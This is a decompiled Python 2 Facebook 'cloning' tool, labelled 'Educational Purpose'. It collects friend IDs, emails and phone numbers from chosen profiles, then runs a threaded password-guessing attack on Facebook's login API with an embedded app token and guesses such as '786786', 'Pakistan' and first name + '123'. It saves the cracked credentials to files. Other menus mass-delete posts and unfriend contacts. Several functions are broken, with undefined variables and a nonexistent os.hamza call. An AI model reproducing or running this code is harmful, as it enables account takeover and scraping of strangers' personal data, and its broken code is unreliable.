
# Python Auto Dis Parser 1.0.1
# Author : HTR-TECH | TAHMID RAYAT
# https://linktr.ee/tahmid.rayat
# https://fb.me/tahmid.rayat.official
# ------------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: dg
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Happy.py')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
    print '[!]\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def hamza(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def hopss(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


banner = '\n\x1b[1;97m\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[1;97m\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\n\x1b[1;97m\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x95\xae\n\x1b[1;97m\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\xa3\xe2\x94\xab\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x83\xe2\x94\x81\xe2\x94\xab\xe2\x95\xad\xe2\x95\xaf\n\x1b[1;97m\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\xe2\x94\x83\xe2\x94\x81\xe2\x94\xab\xe2\x94\x83\n\x1b[1;97m\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x94\xa3\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x95\xaf\n\x1b[1;97m\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb0\xe2\x95\xaf\n\n\x1b[1;97m-----------------------------------------------\n\n\x1b[1;97mCoder   :\x1b[1;97mTech Qaiser\n\x1b[1;97mGithub  :\x1b[1;97mhttps://github.com/TechQaiser\n\x1b[1;97mFacebook:\x1b[1;97mQaiser Abbas\n\x1b[1;97mYoutube :\x1b[1;97mTech Qaiser\n\x1b[1;97mNote :\x1b[1;97mThis Is only For Educational Purpose\n\x1b[1;97mNew Update :\x1b[1;97m Identity Problem Fixed 100% If You Login With Acces Token\n\n\x1b[1;97m-----------------------------------------------'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r[\xe2\x9c\x94]\x1b[1;95mLogging In ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []

def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '[!]\x1b[1;91m Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        name = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] \x1b[1;91mYour Account Is On Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')
    except requests.exceptions.ConnectionError:
        print '[!] \x1b[1;91mOaps No Connection'
        time.sleep(1)

    os.system('clear')
    print banner
    print '\x1b[1;93mName: ' + name
    print ' \x1b[1;93mID  : ' + id
    print 47 * '-'
    print '\x1b[1;97m[1]\x1b[1;97m Start Cloning.'
    print '\x1b[1;97m[2]\x1b[1;97m Clone With Your  Choice Password.'
    print '\x1b[1;97m[3]\x1b[1;97mGrabbing ids Tools.'
    print '\x1b[1;97m[4] \x1b[1;97mAuto Delete Tools.'
    print '\x1b[1;97m[5]\x1b[1;97m Update This Command.'
    print '\x1b[1;97m[6]\x1b[1;97mSubscribe My Youtube Channel.'
    print '\x1b[1;97m[7]\x1b[1;97mLogout'
    print '                  '
    men()


def men():
    rana = raw_input('\x1b[1;96mChoose Option -->  ')
    if rana == '':
        print ' \x1b[1;91mWrong Input'
        men()
    elif rana == '1':
        crack()
    elif rana == '2':
        os.system('clear')
        hamza('[!]\x1b[1;91m Please Wait While ')
        hopss('\x1b[1;97m10%..Loading.')
        hopss('\x1b[1;97m20%.Loading..')
        hopss('\x1b[1;97m50%.Loading..')
        hopss('\x1b[1;97m70%..Loading.')
        hopss('\x1b[1;97m90%..Loading.')
        hopss('\x1b[1;97m95%..Done.')
        os.system('python2 .Choose.py')
        time.sleep(1)
    elif rana == '3':
        grab()
    elif rana == '4':
        bot()
    elif rana == '5':
        os.system('clear')
        print banner
        hamza('[\xe2\x9c\x93] \x1b[1;97mPlease Wait While Tool Is Updating .....')
        os.system('git pull origin master')
        hamza('[\xe2\x9c\x93] \x1b[1;97m Done Tool Has Been Updated ')
        hamza('[\xe2\x9c\x93]\x1b[1;97m Please Wait While Bcoz Setting Is Updating In Your Andriod')
        time.sleep(3)
        os.hamza('python2 Happy.py')
    elif rana == '6':
        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
        menu()
    elif rana == '7':
        os.system('rm -rf login.txt')
        hamza('[\xe2\x9c\x93] Logged Out Successfully')
        os.system('python2 Happy.py')
    else:
        print '[!] \x1b[1;91mWrong Input'
        men()


def crack():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    print '\x1b[1;97m[1] \x1b[1;97mClone From Friendlist.'
    print '\x1b[1;97m[2]\x1b[1;97m Clone From Any Public ID.'
    print '\x1b[1;97m[3] \x1b[1;97mClone From File.'
    print '\x1b[1;97m[0] \x1b[1;97mBack.'
    crack_menu()


def crack_menu():
    global oks
    crm = raw_input('Choose Option >>  ')
    if crm == '':
        print '[!] Filled Incorrectly'
        crack_menu()
    elif crm == '1':
        os.system('clear')
        print banner
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif crm == '2':
        os.system('clear')
        print banner
        idt = raw_input('[\xe2\x98\x95] \x1b[1;97mInput ID: ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            hamza('\x1b[1;97mAccount Name \x1b[1;93m:\x1b[1;97m ' + op['name'])
        except KeyError:
            print '[!] \x1b[1;91mID Not Found!'
            raw_input('\nPress Enter To Back  ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif crm == '3':
        os.system('clear')
        print banner
        try:
            idlist = raw_input('\x1b[1;96m File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] \x1b[1;91mFile Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif crm == '0':
        menu()
    else:
        print 'Filled Incorrectly'
        crack_menu()
    hamza(' \x1b[1;97mTotal Friends: ' + str(len(id)))
    time.sleep(0.5)
    hamza('\x1b[1;97m The Process Has Been Started.')
    time.sleep(0.5)
    hamza('\x1b[1;97mTo Stop Process Press CTRL Then Press Z')
    time.sleep(0.5)
    print 47 * '-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = '786786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
                crt = open('save/checkpoint.txt', 'a')
                crt.write(user + '|' + pass1 + '\n')
                crt.close()
                checkpoint.append(user + pass1)
            else:
                pass2 = 'Pakistan'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                    crt = open('save/checkpoint.txt', 'a')
                    crt.write(user + '|' + pass2 + '\n')
                    crt.close()
                    checkpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '786'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
                        crt = open('save/checkpoint.txt', 'a')
                        crt.write(user + '|' + pass3 + '\n')
                        crt.close()
                        checkpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
                            crt = open('save/checkpoint.txt', 'a')
                            crt.write(user + '|' + pass4 + '\n')
                            crt.close()
                            checkpoint.append(user + pass4)
                        else:
                            pass5 = b['first_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
                                crt = open('save/checkpoint.txt', 'a')
                                crt.write(user + '|' + pass5 + '\n')
                                crt.close()
                                checkpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '1234'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
                                    crt = open('save/checkpoint.txt', 'a')
                                    crt.write(user + '|' + pass6 + '\n')
                                    crt.close()
                                    checkpoint.append(user + pass6)
                                else:
                                    pass7 = b['last_name'] + '786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;97mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
                                        crt = open('save/checkpoint.txt', 'a')
                                        crt.write(user + '|' + pass7 + '\n')
                                        crt.close()
                                        checkpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------------'
    hamza('[Done].\x1b[1;97mProcess Has Been Completed.')
    hamza('[Cp] \x1b[1;97mCheckpoint IDS Has Been Saved.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
    print ' Total \x1b[1;97mOK/\x1b[1;97mCP : \x1b[1;97m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
    print 47 * '-'
    raw_input('\n\x1b[1;97mPress Enter To Back ')
    menu()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] \x1b[1;91mToken Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    print '[1] \x1b[1;97mExtract Numeric IDs From Public ID.'
    print '[2] \x1b[1;97mExtract Emails From Public ID.'
    print '[3]\x1b[1;97m Extract Phone Number From Public ID.'
    print '[0]\x1b[1;97m Back.'
    print '          '
    grab_menu()


def grab_menu():
    grm = raw_input('\n\x1b[1;96mChoose Option >> ')
    if grm == '':
        print ' \x1b[1;91mWrong Input'
        grab_menu()
    elif grm == '1':
        idfromfriend()
    elif grm == '2':
        emailfromfriend()
    elif grm == '3':
        numberfromfriend()
    elif grm == '0':
        menu()
    else:
        print '[!] Wrong input'
        grab_menu()


def idfromfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)

    try:
        os.mkdir('save')
    except OSError:
        pass

    try:
        os.system('clear')
        print banner
        idt = raw_input('[+] Input ID : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print 'Account Name : ' + op['name']
        except KeyError:
            print '[!]\x1b[1;91m Friend Not Found'
            raw_input('Press Enter To Back ')
            grab()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        hamza('\x1b[1;97mGetting Friends Numeric IDs.Wait A while..')
        print '--------------------------------------'
        bz = open('save/id.txt', 'w')
        for a in z['friends']['data']:
            idh.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r[' + str(len(idh)) + ' ] => ' + a['id'],
            sys.stdout.flush()
            time.sleep(0.001)

        bz.close()
        print '\x1b[1;97mThe Process Has Been Completed.'
        print '\x1b[1;97mTotal IDs Founded : ' + str(len(idh))
        done = raw_input('\r[?] Save File With Name : ')
        print '\x1b[1;97mThe File Has Been Saved As save/' + done
        raw_input('\n\x1b[1;97mPress Enter To Back ')
        grab()
    except IOError:
        print '[!] \x1b[1;91mError While Creating file'
        raw_input('\nPress Enter To Back ')
        grab()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97mThe Process Has Been Stopped'
        raw_input('\nPress Enter To Back ')
        grab()
    except KeyError:
        print '[!] \x1b[1;91mError'
        raw_input('\nPress Enter To Back ')
        grab()
    except requests.exceptions.ConnectionError:
        print '[\xe2\x9c\x96] \x1b[1;91mNo Connection'
        time.sleep(1)
        grab()


def emailfromfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] \x1b[1;91mToken Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    try:
        os.mkdir('save')
    except OSError:
        pass

    try:
        os.system('clear')
        print banner
        idt = raw_input('\x1b[1;95m  ID : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97mAccount Name : ' + op['name']
        except KeyError:
            print '[!] \x1b[1;91mAccount Not Found'
            raw_input('\nPress Enter To Back ')
            grab()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        hamza('\x1b[1;97mGetting Emails From')
        print 40 * '\x1b[1;97m-'
        bz = open('save/email.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                emfromfriend.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(emfromfriend)) + '\x1b[1;97m ]\x1b[1;97m  \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            except KeyError:
                pass

        bz.close()
        print '----------------------------------'
        print '\x1b[1;97m Successfully Extracted Mails'
        print ' \x1b[1;97mTotal Mail Founded : ' + str(len(emfromfriend))
        done = raw_input('033[1;97m[\xe2\x9c\x93] \x1b[1;97mSave File With Name\x1b[1;97m :\x1b[1;97m ')
        print ' \x1b[1;97mFile Has Been Saved As : save/' + done
        raw_input('\nPress Enter  To Back ')
        grab()
    except IOError:
        print '[!] \x1b[1;91mError While Creating file'
        raw_input('\nPress Enter To Back ')
        grab()
    except (KeyboardInterrupt, EOFError):
        print '[!] \x1b[1;91mProcess Has Been Stopped'
        raw_input('\nPress Enter To Back ')
        grab()
    except KeyError:
        print '[!] \x1b[1;91mError'
        raw_input('\nPress Enter To Back ')
        grab()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91mNo Connection'
        time.sleep(1)
        grab()


def numberfromfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] \x1b[1;91mToken Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    try:
        os.mkdir('save')
    except OSError:
        pass

    try:
        os.system('clear')
        print banner
        idt = raw_input('[+] Input ID : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97mAccount Name : ' + op['name']
        except KeyError:
            print '[!] \x1b[1;91mFriend Not Found'
            raw_input('\nPress Enter To Back ')
            grab()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        hamza('\x1b[1;97mGetting All Numbers')
        print 40 * '\x1b[1;97m-'
        bz = open('save/number.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                nofromfriend.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(nofromfriend)) + '\x1b[1;97m ]\x1b[1;97m \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.001)
            except KeyError:
                pass

        bz.close()
        print '-----------------------------------'
        print '\x1b[1;97mTotal Number Founded : ' + str(len(nofromfriend))
        done = raw_input(' \x1b[1;97mSave File With Name: ')
        print ' \x1b[1;97mFile Has Been Saved As save/' + done
        raw_input('\nPress Enter To Back ')
        grab()
    except IOError:
        print '[!] \x1b[1;91mError While Creating file'
        raw_input('\nPress Enter To Back ')
        grab()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91mThe Process Has Been Stopped'
        raw_input('\nPress Enter To Back')
        grab()
    except KeyError:
        print '\x1b[1;91m Error'
        raw_input('\nPress Enter To Back ')
        grab()
    except requests.exceptions.ConnectionError:
        print ' \x1b[1;91mNo Connection'
        time.sleep(1)
        grab()


def bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!]\x1b[1;91m Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    print '[1] \x1b[1;97mAuto Delete Posts.'
    print '[2] \x1b[1;97mAuto Accept Friend Requests.'
    print '[3] \x1b[1;97mAuto Unfriend All Friends '
    print '[0] Back.'
    print '         '
    bot_menu()


def bot_menu():
    bots = raw_input('\nChoose Option >> ')
    if bots == '':
        print '[!] \x1b[1;91mWrong Input'
        bot_menu()
    elif bots == '1':
        deletepost()
    elif bots == '2':
        accept()
    elif bots == '3':
        unfriend()
    elif bots == '0':
        menu()
    else:
        print '[!] \x1b[1;91mWrong Input'
        bot_menu()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        name = lol['name']
    except IOError:
        print '[!]\x1b[1;91m Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(0.1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    print '\x1b[1;97mAccount Name : ' + nama
    hamza('\x1b[1;97mThe Process Has Been Started')
    print 40 * '-'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;97m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m] \x1b[1;97m[!] Failed'
        except TypeError:
            print '\x1b[1;97m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m \x1b[1;97[\xe2\x9c\x93] [Deleted]'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91mConnection Error'
            raw_input('\nPress Enter To Back ')
            bot()

    print 40 * '-'
    print '\x1b[1;91mThe Process Has Been Completed. '
    raw_input('\nPress Enter To Back ')
    bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    limit = raw_input('\x1b[1;97mEnter Limit To Accept Requests : ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;97mNo friend Request'
        raw_input('\x1b[1;97mPress Enter To Back ')
        bot()
    hamza('\x1b[1;97mThe Process Has Been Start')
    print 40 * '-'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m [Failed] | ' + i['from']['name']
        else:
            print '\x1b[1;97m[Accepted] |  ' + i['from']['name']

    print 40 * '-'
    print '\x1b[1;97mThe Process Has Been Completed.'
    raw_input('\nPress Enter To Back ')
    bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        os.system('python2 Happy.py')

    os.system('clear')
    print banner
    hamza('\x1b[1;97mThe Process Has Been Started.')
    print '\x1b[1;97mPress CTRL Z to Stop Process.'
    print 50 * '-'
    try:
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            name = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
            print '\x1b[1;97m [Unfriended] | ' + name

    except IndexError:
        pass
    except KeyboardInterrupt:
        print '\x1b[1;97mThe Process Has Been Stopped'
        raw_input('\n Press Enter To Back ')
        bot()

    print '\x1b[1;97mThe Process Has Been Completed.'
    raw_input('Press Enter To Back ')
    bot()


if __name__ == '__main__':
    menu()
